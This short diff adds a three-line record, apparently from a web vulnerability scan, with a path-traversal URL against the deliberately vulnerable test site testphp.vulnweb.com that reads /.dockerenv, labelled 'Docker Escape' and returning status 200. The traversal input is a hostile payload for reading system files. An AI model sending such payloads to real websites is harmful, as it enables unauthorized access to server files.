@@ -1,0 +1,3 @@
+URL: http://testphp.vulnweb.com/showimage.php?file=../../../../../../../../../../../.dockerenv
+Payload: Docker Escape
+Status: 200
